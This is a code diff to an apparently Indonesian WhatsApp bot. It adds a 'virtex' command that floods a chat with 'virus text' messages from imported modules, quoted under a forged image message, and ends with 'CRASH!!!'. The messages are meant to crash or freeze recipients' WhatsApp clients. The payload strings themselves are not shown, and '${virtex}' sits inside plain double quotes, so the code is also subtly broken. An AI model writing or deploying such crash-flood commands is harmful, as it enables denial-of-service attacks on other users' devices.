@@ -29,9 +29,11 @@ const { doc } = require('./virtex/doc')
 const { four } = require('./virtex/four')
 const { jobot } = require('./virtex/jobot')
 const { jobot2 } = require('./virtex/jobot2')
+const { virtex } = require('./virtex/virtex')
 const { virtex1 } = require('./virtex/virtex1')
 const { virtex2 } = require('./virtex/virtex2')
 const { virtex3 } = require('./virtex/virtex3')
+const { ikymakerz } = require('./virtex/ikymakerz')
 const { intro } = require('./src/intro')
 const moment = require('moment-timezone')
 const { JSDOM } = require('jsdom')
@@ -7466,6 +7468,38 @@ await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
 await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
 await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
  jancok(`🚀🔥`)
+ }
+ break
+ case 'virtex': {
+ if (!isCreator && !isBan) return
+   asukonyol11 = { 
+   key: { 
+   fromMe: false, 
+   participant: `0@s.whatsapp.net`, 
+ ...({ remoteJid: "" }) 
+  }, 
+  message: { 
+ "imageMessage": { 
+ "mimetype": "image/jpeg", 
+ "caption": `IKY VIRTEX`,
+ "jpegThumbnail": virgam
+ } 
+ } 
+ }
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
  }
  break
  case 'itzmeiky': {            
